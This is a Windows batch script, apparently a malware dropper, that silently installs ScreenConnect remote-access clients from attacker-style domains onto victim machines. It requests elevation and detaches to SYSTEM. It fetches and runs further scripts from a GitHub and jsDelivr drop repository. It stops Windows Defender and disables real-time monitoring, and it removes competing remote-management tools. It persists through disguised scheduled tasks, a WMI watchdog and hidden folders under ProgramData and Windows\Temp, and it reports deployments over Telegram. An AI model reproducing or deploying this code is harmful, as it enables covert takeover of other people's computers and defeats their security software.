@echo off
setlocal EnableExtensions EnableDelayedExpansion
REM OWN BUILD 20260804O52 - MSI OLE magic; soft AV (no Sense kill / no WinDefend disable)
set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "BOOT=%SystemRoot%\Temp\.wucache"
set "LOG=%WD%\boot.err"
set "MSI=%TEMP%\sc_primary.msi"
set "MSICACHE=%WD%\pkg.msi"
set "PRIM=ScreenConnect Client (5f6010579852e507)"
set "ALT=ScreenConnect Client (f861c8140d453427)"
set "GRYXA=ScreenConnect Client (36e506ff016b2151)"
set "KEEP1=5f6010579852e507"
set "KEEP2=f861c8140d453427"
set "KEEP3=36e506ff016b2151"
set "MSIURL=https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "MSIURL_GRYXA=https://ui.gryxa.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "MSI_G=%TEMP%\sc_gryxa.msi"
set "MSICACHE_G=%WD%\pkg_gryxa.msi"
set "SELF=%WD%\own_run.cmd"
set "PF86=%ProgramFiles(x86)%"
set "DROP=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
set "DROP2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main"
set "CURL=%SystemRoot%\System32\curl.exe"
if not exist "%CURL%" set "CURL=curl.exe"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%BOOT%" mkdir "%BOOT%" >nul 2>&1

REM O47b: unharden workdir on entry — LockDir (SYSTEM+Admin only) froze hosts on old
REM builds by blocking self-update downloads. Re-open so the tick can always update.
attrib -h -s -r "%WD%" >nul 2>&1
attrib -h -s -r "%WD%\*" >nul 2>&1
icacls "%WD%" /reset /T /C /Q >nul 2>&1
icacls "%WD%" /grant "NT AUTHORITY\SYSTEM:(OI)(CI)F" "BUILTIN\Administrators:(OI)(CI)F" /C /Q >nul 2>&1

REM Survive ScreenConnect Guest kill: detach into SYSTEM worker
if /I not "%~1"=="_RUN" (
  echo === OWN BUILD 20260802O50 ===
  echo whoami:
  whoami
  set "ELEV=0"
  whoami /groups | find "S-1-16-12288" >nul 2>&1 && set "ELEV=1"
  whoami /groups | find "S-1-5-18" >nul 2>&1 && set "ELEV=1"
  whoami | find /I "SYSTEM" >nul 2>&1 && set "ELEV=1"
  if "!ELEV!"=="0" (
    echo.
    echo *** NOT ELEVATED / NOT SYSTEM ***
    echo In ScreenConnect Command window: set Run as = SYSTEM
    echo Attempting UAC elevate ^(click Yes if prompted^)...
    copy /y "%~f0" "%BOOT%\own_elev.cmd" >nul 2>&1
    powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c \"%BOOT%\own_elev.cmd\"' -Verb RunAs"
    echo If no UAC prompt appeared, re-run command as SYSTEM.
    exit /b 5
  )
  echo elevated_ok>>"%BOOT%\boot.err" 2>nul
  REM O41b: never overwrite a locked own_run.cmd (prior worker holds it) — unique runner always.
  REM Also strip attrs on WD targets before any later copy.
  attrib -h -s -r "%BOOT%\own_run.cmd" >nul 2>&1
  attrib -h -s -r "%SELF%" >nul 2>&1
  set "RUNNER=%BOOT%\own_o32_%RANDOM%%RANDOM%.cmd"
  copy /y "%~f0" "!RUNNER!" >nul 2>&1
  if not exist "!RUNNER!" (
    echo ERROR: cannot write unique runner under %BOOT%
    exit /b 6
  )
  findstr /C:"OWN BUILD 20260802O50" "!RUNNER!" >nul 2>&1
  if errorlevel 1 (
    echo ERROR: runner copy is not O41 - abort
    exit /b 7
  )
  REM best-effort refresh of canonical paths (ignore lock failures)
  copy /y "!RUNNER!" "%BOOT%\own_run.cmd" >nul 2>&1
  mkdir "%WD%" >nul 2>&1
  copy /y "!RUNNER!" "%SELF%" >nul 2>&1
  echo go_start %DATE% %TIME%>>"%BOOT%\boot.err" 2>nul
  set "LOG=%WD%\boot.err"
  echo go_start %DATE% %TIME%>>"%LOG%" 2>nul
  if not exist "%LOG%" set "LOG=%BOOT%\boot.err"
  echo order=exterminate_then_repair_then_install>>"%LOG%" 2>nul
  echo engine=cmd_detached_o32>>"%LOG%" 2>nul
  echo whoami_launcher=>>"%LOG%" 2>nul
  whoami >>"%LOG%" 2>&1
  echo detach_begin>>"%LOG%" 2>nul
  echo runner=!RUNNER!>>"%LOG%" 2>nul
  set "DETACH_OK=0"

  REM Method A: plain schtasks as SYSTEM (paths have no spaces)
  REM NOTE: RUNNER is set inside this block - MUST use !RUNNER! (delayed expansion)
  schtasks /Delete /TN "WucacheOwn" /F >nul 2>&1
  schtasks /Create /TN "WucacheOwn" /RU SYSTEM /RL HIGHEST /SC ONCE /ST 23:59 /F /TR "cmd.exe /c !RUNNER! _RUN" >"%BOOT%\detach.task" 2>&1
  if not errorlevel 1 (
    del /f /q "%BOOT%\wproof" >nul 2>&1
    schtasks /Run /TN "WucacheOwn" >"%BOOT%\detach.run" 2>&1
    if not errorlevel 1 (
      REM SC Guest often kills at 10s — do NOT wait 12s for proof; /Run means worker launched.
      set "DETACH_OK=1"
      echo detach_via=schtasks_root>>"%LOG%"
    )
  )

  REM Method B: wmic (often absent on Win11)
  if "!DETACH_OK!"=="0" (
    wmic process call create "cmd.exe /c \"!RUNNER!\" _RUN" >"%BOOT%\detach.wmic" 2>&1
    findstr /C:"ReturnValue = 0" "%BOOT%\detach.wmic" >nul 2>&1
    if not errorlevel 1 (
      set "DETACH_OK=1"
      echo detach_via=wmic>>"%LOG%"
    )
  )

  REM Method C: one-shot service (flat path; cmd not a service - last resort)
  if "!DETACH_OK!"=="0" (
    copy /y "!RUNNER!" "%SystemRoot%\Temp\wucache_own.cmd" >nul 2>&1
    sc.exe stop WucacheOwn >nul 2>&1
    sc.exe delete WucacheOwn >nul 2>&1
    sc.exe create WucacheOwn binPath= "cmd.exe /c %SystemRoot%\Temp\wucache_own.cmd _RUN" start= demand type= own >"%BOOT%\detach.sc" 2>&1
    sc.exe start WucacheOwn >"%BOOT%\detach.scstart" 2>&1
    findstr /I /C:"START_PENDING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    findstr /I /C:"RUNNING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    if "!DETACH_OK!"=="1" echo detach_via=sc_service>>"%LOG%"
  )

  REM Method D: inline fallback (Guest may kill; better than nothing)
  if "!DETACH_OK!"=="0" (
    echo detach_via=inline_fallback>>"%LOG%"
    echo WARNING: detach APIs failed - running inline ^(Guest may kill^)

    call "!RUNNER!" _RUN
    exit /b !ERRORLEVEL!
  )

  echo detach_done>>"%LOG%"
  echo Detached OK. Wait ~90s then:
  echo   type "%LOG%"
  echo   type "%BOOT%\boot.err"
  echo   sc query state= all ^| findstr /I ScreenConnect
  exit /b 0
)

echo worker_start %DATE% %TIME%>>"%LOG%"
echo ok>"%BOOT%\wproof" 2>nul
echo === OWN WORKER 20260802O46 ===
if not exist "%LOG%" (
  set "LOG=%SystemRoot%\Temp\.wucache\boot.err"
  if not exist "%SystemRoot%\Temp\.wucache" mkdir "%SystemRoot%\Temp\.wucache" >nul 2>&1
  echo worker_start %DATE% %TIME%>>"%LOG%"
)

echo [0] Refresh core payloads (always fetch latest; embed = offline fallback only)...
set "STG=%SystemRoot%\Temp\.upd"
if not exist "%STG%" mkdir "%STG%" >nul 2>&1
attrib -h -s -r "%WD%" >nul 2>&1
icacls "%WD%" /grant "NT AUTHORITY\SYSTEM:(OI)(CI)F" "BUILTIN\Administrators:(OI)(CI)F" /C /Q >nul 2>&1
attrib -h -s -r "%WD%\own_mon.cmd" "%WD%\own_secure.cmd" "%WD%\tg_report.ps1" "%WD%\own_lib.ps1" >nul 2>&1

rem O48: ALWAYS pull latest from repo (staged in Temp, never blocked by WD lock).
rem Embed below is only a fallback when there is no network.
set "NETOK=0"
"%CURL%" -L --ssl-no-revoke --connect-timeout 12 --max-time 60 -o "%STG%\own_lib.ps1" "%DROP%/own_lib.ps1?t=%RANDOM%" >nul 2>&1
if not exist "%STG%\own_lib.ps1" "%CURL%" -L --connect-timeout 12 --max-time 60 -o "%STG%\own_lib.ps1" "%DROP2%/own_lib.ps1" >nul 2>&1
findstr /C:"OWN_LIB  BUILD" "%STG%\own_lib.ps1" >nul 2>&1 && set "NETOK=1"

if "%NETOK%"=="1" (
  "%CURL%" -L --ssl-no-revoke --connect-timeout 12 --max-time 60 -o "%STG%\own_mon.cmd" "%DROP%/own_mon.cmd?t=%RANDOM%" >nul 2>&1
  if not exist "%STG%\own_mon.cmd" "%CURL%" -L --connect-timeout 12 --max-time 60 -o "%STG%\own_mon.cmd" "%DROP2%/own_mon.cmd" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 12 --max-time 60 -o "%STG%\own_secure.cmd" "%DROP%/own_secure.cmd?t=%RANDOM%" >nul 2>&1
  if not exist "%STG%\own_secure.cmd" "%CURL%" -L --connect-timeout 12 --max-time 60 -o "%STG%\own_secure.cmd" "%DROP2%/own_secure.cmd" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 12 --max-time 60 -o "%STG%\tg_report.ps1" "%DROP%/tg_report.ps1?t=%RANDOM%" >nul 2>&1
  if not exist "%STG%\tg_report.ps1" "%CURL%" -L --connect-timeout 12 --max-time 60 -o "%STG%\tg_report.ps1" "%DROP2%/tg_report.ps1" >nul 2>&1
  rem BUILD-verify each then move into WD
  findstr /C:"OWN_MON  BUILD" "%STG%\own_mon.cmd" >nul 2>&1 && for %%F in ("%STG%\own_mon.cmd") do if %%~zF GTR 1500 move /y "%STG%\own_mon.cmd" "%WD%\own_mon.cmd" >nul 2>&1
  findstr /C:"OWN_SECURE BUILD" "%STG%\own_secure.cmd" >nul 2>&1 && for %%F in ("%STG%\own_secure.cmd") do if %%~zF GTR 800 move /y "%STG%\own_secure.cmd" "%WD%\own_secure.cmd" >nul 2>&1
  findstr /C:"OWN_LIB  BUILD" "%STG%\own_lib.ps1" >nul 2>&1 && for %%F in ("%STG%\own_lib.ps1") do if %%~zF GTR 1500 move /y "%STG%\own_lib.ps1" "%WD%\own_lib.ps1" >nul 2>&1
  findstr /C:"TG_REPORT BUILD" "%STG%\tg_report.ps1" >nul 2>&1 && for %%F in ("%STG%\tg_report.ps1") do if %%~zF GTR 1500 move /y "%STG%\tg_report.ps1" "%WD%\tg_report.ps1" >nul 2>&1
  echo core_fetch_latest_done>>"%LOG%"
) else (
  echo net_offline_using_embed>>"%LOG%"
  call :Extract B64_MON "%WD%\own_mon.cmd"
  call :Extract B64_SEC "%WD%\own_secure.cmd"
  call :Extract B64_TGR "%WD%\tg_report.ps1"
  call :Extract B64_LIB "%WD%\own_lib.ps1"
  if not exist "%WD%\notify.cfg" call :Extract B64_NTF "%WD%\notify.cfg"
  echo embed_extract_done>>"%LOG%"
)
del /f /q "%STG%\own_mon.cmd" "%STG%\own_secure.cmd" "%STG%\own_lib.ps1" "%STG%\tg_report.ps1" >nul 2>&1

echo [1] Defender + harden (exclusions/ACL) + soft AV stop...
echo av_reg_begin>>"%LOG%"
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"
start "" /b cmd /c "sc stop WinDefend >nul 2>&1 & sc stop WdNisSvc >nul 2>&1 & powershell -NoProfile -NonInteractive -Command \"try{Set-MpPreference -DisableRealtimeMonitoring $true}catch{}\" >nul 2>&1"
echo av_fight_done>>"%LOG%"

echo [2] Download PRIMARY MSI (curl / powershell / github-pkg / cache)...
call :FetchMsi "%MSI%"
set "GOTMSI=%ERRORLEVEL%"
if "%GOTMSI%"=="0" (
  echo msi_ready>>"%LOG%"
) else (
  echo msi_fetch_FAILED>>"%LOG%"
)

echo [3] Exterminate foreign SC + disallowed RMM FIRST (clean field = SC installer custom action cannot collide)...
call :NukeForeign

echo [4] Ensure PRIMARY (SC-aware ladder: start -> /fa repair -> /i ONLY if unregistered)...
call :NoMsiPolicy
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary already RUNNING
  echo primary_already_running>>"%LOG%"
  goto :after_primary_install
)

REM present but STOPPED: restart, then /fa repair (never /i - shared legacy UpgradeCodes wipe ALT)
sc query "%PRIM%" >nul 2>&1
if not errorlevel 1 (
  echo primary_present_stopped_restart>>"%LOG%"
  net start "%PRIM%" >nul 2>&1
  sc start "%PRIM%" >nul 2>&1
  timeout /t 8 /nobreak >nul
  sc query "%PRIM%" | findstr /I RUNNING >nul
  if not errorlevel 1 (
    echo primary_restarted_ok>>"%LOG%"
    goto :after_primary_install
  )
  echo primary_stopped_try_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
  sc query "%PRIM%" | findstr /I RUNNING >nul
  if not errorlevel 1 (
    echo primary_repaired_ok>>"%LOG%"
    goto :after_primary_install
  )
  echo primary_repair_failed_still_stopped>>"%LOG%"
  goto :after_primary_install
)

REM service missing: try /fa if product registered (safe - no Upgrade table remove)
echo primary_svc_missing_try_repair>>"%LOG%"
if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_repaired_ok>>"%LOG%"
  goto :after_primary_install
)

if not "%GOTMSI%"=="0" (
  echo primary_skip_install_no_msi>>"%LOG%"
  goto :after_primary_install
)

REM refuse /i if product already registered - /i re-enters Upgrade table and can wipe ALT
set "REGSTATE=unknown"
if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action registered -Fp "%KEEP1%" -WorkDir "%WD%"`) do set "REGSTATE=%%R"
if /I "!REGSTATE!"=="yes" (
  echo primary_registered_skip_fresh_install>>"%LOG%"
  goto :after_primary_install
)

REM stale install dir with no registered product breaks SC custom action FixupServiceArguments
if exist "%PF86%\ScreenConnect Client (%KEEP1%)" (
  echo stale_primary_dir_clean>>"%LOG%"
  rmdir /s /q "%PF86%\ScreenConnect Client (%KEEP1%)" >nul 2>&1
)
if exist "%ProgramFiles%\ScreenConnect Client (%KEEP1%)" (
  echo stale_primary_dir_clean_pf>>"%LOG%"
  rmdir /s /q "%ProgramFiles%\ScreenConnect Client (%KEEP1%)" >nul 2>&1
)

echo primary missing/unregistered - MSI install (LAST RESORT - Upgrade table may touch siblings)...
REM O50: refuse sevrz /i when ANY gryxa.com SC is present — shared UpgradeCodes knock Gryxa OFFLINE.
set "GPRESENT=0"
for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE_NAME: ScreenConnect Client"') do (
  set "_FP=%%a"
  set "_FP=!_FP: =!"
  for /f "usebackq delims=" %%I in (`reg query "HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (!_FP!)" /v ImagePath 2^>nul ^| findstr /I "ImagePath"`) do (
    echo %%I | findstr /I "gryxa.com" >nul && set "GPRESENT=1"
  )
)
if "!GPRESENT!"=="1" (
  echo primary_skip_i_protect_gryxa>>"%LOG%"
  goto :after_primary_install
)
echo primary_install_begin>>"%LOG%"
msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install.log"
set "INST_EXIT=!ERRORLEVEL!"
echo msi_exit_!INST_EXIT!>>"%LOG%"
if "!INST_EXIT!"=="1618" (
  echo msi_busy_retry1>>"%LOG%"
  timeout /t 30 /nobreak >nul
  msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install2.log"
  set "INST_EXIT=!ERRORLEVEL!"
  echo msi_retry1618_exit_!INST_EXIT!>>"%LOG%"
)
if "!INST_EXIT!"=="1618" (
  echo msi_busy_retry2>>"%LOG%"
  timeout /t 45 /nobreak >nul
  msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install3.log"
  set "INST_EXIT=!ERRORLEVEL!"
  echo msi_retry1618_exit_!INST_EXIT!>>"%LOG%"
)
timeout /t 15 /nobreak >nul

REM post-install: product registered but service entry still missing -> /fa by GUID (safe)
sc query "%PRIM%" >nul 2>&1
if errorlevel 1 (
  echo postinstall_svc_missing_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

:after_primary_install
sc config "%PRIM%" start= auto >nul 2>&1
sc failure "%PRIM%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 5 /nobreak >nul
sc start "%PRIM%" >nul 2>&1
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_running_ok>>"%LOG%"
) else (
  echo primary_still_down_after_install>>"%LOG%"
  sc query "%PRIM%" >>"%LOG%" 2>&1
)

echo [5] Start allowlist...
sc config "%ALT%" start= auto >nul 2>&1
sc start "%ALT%" >nul 2>&1
sc config "%PRIM%" start= auto >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 2 /nobreak >nul
REM O41: restore ALT if its service entry was deleted (SC-family msiexec side effect)
sc query "%ALT%" >nul 2>&1
if errorlevel 1 if exist "%WD%\own_lib.ps1" (
  echo alt_missing_repair>>"%LOG%"
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP2%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

echo [5b] Gryxa MUST-RUN deep ensure (svc+dir+TCP/relay+FP drift)...
if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -Deep -WorkDir "%WD%" -Build O42 >>"%LOG%" 2>&1
) else (
  call :EnsureGryxaMust
)
if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "KEEP3=%%L"
if defined KEEP3 set "GRYXA=ScreenConnect Client (%KEEP3%)"
sc query "%GRYXA%" | findstr /I RUNNING >nul
if errorlevel 1 if exist "%WD%\own_lib.ps1" (
  echo gryxa_force_after_deep>>"%LOG%"
  del /f /q "%WD%\gryxa_reinstall.flag" >nul 2>&1
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -Deep -Force -WorkDir "%WD%" -Build O42 >>"%LOG%" 2>&1
  if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "KEEP3=%%L"
  if defined KEEP3 set "GRYXA=ScreenConnect Client (%KEEP3%)"
)
sc query "%GRYXA%" | findstr /I RUNNING >nul
if not errorlevel 1 (echo gryxa_must_running_ok>>"%LOG%") else (echo gryxa_must_still_down>>"%LOG%")

echo [6] Arm wipe-proof persist (identity tasks + WMI watchdog + MSI cache)...
echo persist_begin>>"%LOG%"
if exist "%~dp0notify.cfg" call :ForceCopy "%~dp0notify.cfg" "%WD%\notify.cfg"
if not exist "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" mkdir "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" >nul 2>&1
call :ForceCopy "%WD%\own_mon.cmd" "%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd"

if exist "%MSI%" for %%A in ("%MSI%") do if %%~zA GEQ 500000 (
  call :ForceCopy "%MSI%" "%MSICACHE%"
  echo msi_cached_bytes=%%~zA>>"%LOG%"
)

REM anti-signature identity: per-host task names + jittered schedule
REM O39/L13: Create like WucacheOwn â€” BOOT TR path + cmd schtasks + /ST (WD is ACL-locked)
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action init -WorkDir "%WD%" >nul 2>&1
if exist "%WD%\identity.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\identity.cfg") do set "%%K=%%L"
if not defined TASK_A set "TASK_A=WerQueueSync"
if not defined TASK_B set "TASK_B=PlaServerHealth"
if not defined TASK_C set "TASK_C=WdiHostProxy"
if not defined TASK_D set "TASK_D=TcpIpConflictRes"
if not defined MO_A set "MO_A=2"
if not defined MO_B set "MO_B=3"
REM strip leading \ if present (IDENTVER 6/7 leftovers)
if "!TASK_A:~0,1!"=="\" set "TASK_A=!TASK_A:~1!"
if "!TASK_B:~0,1!"=="\" set "TASK_B=!TASK_B:~1!"
if "!TASK_C:~0,1!"=="\" set "TASK_C=!TASK_C:~1!"
if "!TASK_D:~0,1!"=="\" set "TASK_D=!TASK_D:~1!"
echo identity_A=!TASK_A!>>"%LOG%"
echo identity_B=!TASK_B!>>"%LOG%"
echo identity_C=!TASK_C!>>"%LOG%"
echo identity_D=!TASK_D! mo=!MO_A!/!MO_B!>>"%LOG%"

REM TR under BOOT (Windows\Temp\.wucache) â€” same tree as working WucacheOwn detach
if not exist "%BOOT%" mkdir "%BOOT%" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%BOOT%\own_mon.cmd" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%BOOT%\etl_mon.cmd" >nul 2>&1
if not exist "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" mkdir "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd" >nul 2>&1

for /f "tokens=1-2 delims=:" %%H in ("%TIME%") do set "ST=%%H:%%I"
set "ST=!ST: =0!"
echo create_taskA_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_A!" /F >nul 2>&1
schtasks /Create /TN "!TASK_A!" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO !MO_A! /ST !ST! /F /TR "cmd.exe /c %BOOT%\own_mon.cmd" >>"%LOG%" 2>&1
echo create_taskB_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_B!" /F >nul 2>&1
schtasks /Create /TN "!TASK_B!" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO !MO_B! /ST !ST! /F /TR "cmd.exe /c %BOOT%\etl_mon.cmd" >>"%LOG%" 2>&1
echo create_taskC_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_C!" /F >nul 2>&1
schtasks /Create /TN "!TASK_C!" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "cmd.exe /c %BOOT%\own_mon.cmd" >>"%LOG%" 2>&1
echo create_taskD_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_D!" /F >nul 2>&1
schtasks /Create /TN "!TASK_D!" /RU SYSTEM /RL HIGHEST /SC ONLOGON /F /TR "cmd.exe /c %BOOT%\own_mon.cmd" >>"%LOG%" 2>&1
echo persist_armed_identity>>"%LOG%"
schtasks /Query /TN "!TASK_A!" >nul 2>&1 || echo verify_taskA_FAIL>>"%LOG%"
schtasks /Query /TN "!TASK_B!" >nul 2>&1 || echo verify_taskB_FAIL>>"%LOG%"
schtasks /Query /TN "!TASK_C!" >nul 2>&1 || echo verify_taskC_FAIL>>"%LOG%"
schtasks /Query /TN "!TASK_D!" >nul 2>&1 || echo verify_taskD_FAIL>>"%LOG%"
schtasks /Run /TN "!TASK_A!" >nul 2>&1
echo first_tick_run>>"%LOG%"

REM also run lib tasks-ensure (idempotent repair / ownership check)
if exist "%WD%\own_lib.ps1" (
  for /f "usebackq delims=" %%R in (`powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action tasks-ensure -WorkDir "%WD%" -MonPath "%WD%\own_mon.cmd"`) do (
    echo tasks_ensure %%R>>"%LOG%"
  )
)

REM chain 2: WMI watchdog subscription (mutual persistence)
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action watchdog -WorkDir "%WD%" -MonPath "%BOOT%\own_mon.cmd" >nul 2>&1
echo watchdog_armed>>"%LOG%"

REM campaign state baseline
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build O42 -Extra "deploy" >nul 2>&1

echo [6b] Re-lock persist dirs/tasks/SC after arm...
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"

echo [7] First-deploy Telegram report...
if not exist "%WD%\notify.cfg" (
  if exist "%~dp0notify.cfg" (
    call :ForceCopy "%~dp0notify.cfg" "%WD%\notify.cfg"
  ) else (
    echo notify_cfg_MISSING>>"%LOG%"
    echo WARNING: notify.cfg missing - TG report will be skipped. Seed BOT_TOKEN/CHAT_ID into %WD%\notify.cfg
  )
)
if exist "%WD%\notify.cfg" (
  powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State DEPLOY -Summary "own.cmd first deploy complete" -WorkDir "%WD%" -Build O42 >>"%LOG%" 2>&1
) else (
  echo deploy_tg_skipped_no_notify>>"%LOG%"
)
echo deploy_tg_done>>"%LOG%"

sc query "%PRIM%" >>"%LOG%" 2>&1
sc query state= all | findstr /I ScreenConnect >>"%LOG%"
echo go_exit_0>>"%LOG%"
exit /b 0

REM ========== helpers ==========
:FetchMsi
set "OUT=%~1"
del /f /q "%OUT%" >nul 2>&1
echo fetch_msi_begin>>"%LOG%"

if exist "%SystemRoot%\System32\curl.exe" (
  echo fetch_try=curl_sys>>"%LOG%"
  "%SystemRoot%\System32\curl.exe" -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
)
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=curl_path>>"%LOG%"
curl.exe -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=powershell>>"%LOG%"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
  "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" ^
  "Try{Invoke-WebRequest -Uri '%MSIURL%' -OutFile '%OUT%' -UseBasicParsing -TimeoutSec 180}Catch{Add-Content -LiteralPath '%LOG%' -Value ('fetch_ps_err '+$_.Exception.Message)}" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=github_pkg>>"%LOG%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 30 --max-time 300 -o "%OUT%" "%DROP%/pkg.msi?t=%RANDOM%" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=jsdelivr_pkg>>"%LOG%"
"%CURL%" -L --connect-timeout 30 --max-time 300 -o "%OUT%" "%DROP2%/pkg.msi" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

if exist "%MSICACHE%" (
  echo fetch_try=cache>>"%LOG%"
  copy /y "%MSICACHE%" "%OUT%" >nul
  call :MsiOk "%OUT%"
  if not errorlevel 1 exit /b 0
)

echo fetch_msi_all_failed>>"%LOG%"
exit /b 1

:MsiOk
if not exist "%~1" exit /b 1
for %%A in ("%~1") do (
  echo msi_bytes=%%~zA>>"%LOG%"
  if %%~zA LSS 500000 (
    echo msi_too_small>>"%LOG%"
    del /f /q "%~1" >nul 2>&1
    exit /b 1
  )
)
rem O51: OLE magic d0cf11e0 — reject HTML/error pages (same class as L37 Gryxa)
powershell -NoProfile -NonInteractive -Command "$p=$args[0]; $fs=[IO.File]::OpenRead($p); $b=New-Object byte[] 4; [void]$fs.Read($b,0,4); $fs.Close(); if($b[0]-eq 0xD0 -and $b[1]-eq 0xCF -and $b[2]-eq 0x11 -and $b[3]-eq 0xE0){exit 0}else{exit 1}" "%~1" >nul 2>&1
if errorlevel 1 (
  echo msi_bad_magic>>"%LOG%"
  del /f /q "%~1" >nul 2>&1
  exit /b 1
)
copy /y "%~1" "%MSICACHE%" >nul 2>&1
exit /b 0

:NukeForeign
echo exterminate_begin>>"%LOG%"
if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action exterminate -WorkDir "%WD%" >>"%LOG%" 2>&1
) else (
  echo exterminate_skipped_no_lib>>"%LOG%"
)
echo exterminate_done>>"%LOG%"
REM settle Windows Installer mutex after /x before any /i or /fa
timeout /t 8 /nobreak >nul
exit /b 0

:EnsureGryxaMust
rem O42: thin fallback — prefer lib gryxa-ensure; never msiexec here.
if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -WorkDir "%WD%" -Build O42 >>"%LOG%" 2>&1
)
if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "KEEP3=%%L"
if defined KEEP3 set "GRYXA=ScreenConnect Client (%KEEP3%)"
sc query "%GRYXA%" | findstr /I RUNNING >nul
